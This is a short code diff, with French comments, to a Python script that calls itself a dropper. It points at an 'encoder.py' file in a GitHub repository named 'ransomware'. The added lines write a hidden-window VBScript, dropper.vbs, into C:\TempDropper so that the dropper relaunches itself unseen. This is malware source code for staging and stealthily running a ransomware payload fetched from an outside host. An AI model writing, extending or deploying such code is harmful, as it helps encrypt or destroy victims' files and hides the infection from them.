@@ -7,6 +7,24 @@ import sys
 # URL RAW du script cible (encoder.py)
 url = "https://raw.githubusercontent.com/mehdibha09/ransomware/main/encoder.py"
 
+# Chemin du dossier et fichier VBS
+vbs_folder = r"C:\TempDropper"
+vbs_path = os.path.join(vbs_folder, "dropper.vbs")
+
+if not os.path.exists(vbs_folder):
+        os.makedirs(vbs_folder)
+if not os.path.isfile(vbs_path):
+        # Exemple simple : VBS qui lance ce script Python
+        vbs_code = f'''
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "python {os.path.abspath(sys.argv[0])}", 0, False
+'''
+        with open(vbs_path, "w", encoding="utf-8") as f:
+            f.write(vbs_code)
+        print(f"[+] Fichier VBS créé : {vbs_path}")
+else:
+        print(f"[=] Fichier VBS déjà existant : {vbs_path}")
+
 try:
         # Chemin absolu vers ce script Python (dropper)
         chemin_script = os.path.abspath(sys.argv[0])
